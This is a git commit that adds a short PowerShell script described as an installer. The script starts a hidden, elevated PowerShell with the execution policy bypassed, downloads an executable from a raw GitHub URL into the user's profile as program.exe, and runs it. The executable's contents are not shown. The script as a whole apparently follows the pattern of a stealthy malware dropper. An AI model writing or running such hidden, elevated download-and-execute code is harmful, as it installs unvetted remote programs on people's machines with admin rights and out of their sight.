ad004f906d4f5d4f670413417a2b5ad65edd2e52
MRvinyKing <123846936+MRvinyKing@users.noreply.github.com>
2024-05-20 14:37:36 -0300

    instalador via shell

---
+++ i.ps1
@@ -0,0 +1,6 @@
+$userDirectory = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
+$fileUrl = "https://raw.githubusercontent.com/MRvinyKing/lpoptm/main/output.exe"
+$startFilePath = "$userDirectory\program.exe"
+$downloadCommand = "Invoke-WebRequest -Uri '$fileUrl' -OutFile '$startFilePath'"
+$startupCommand = "Start-Process '$startFilePath'"
+Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `$($downloadCommand); `$($startupCommand)"
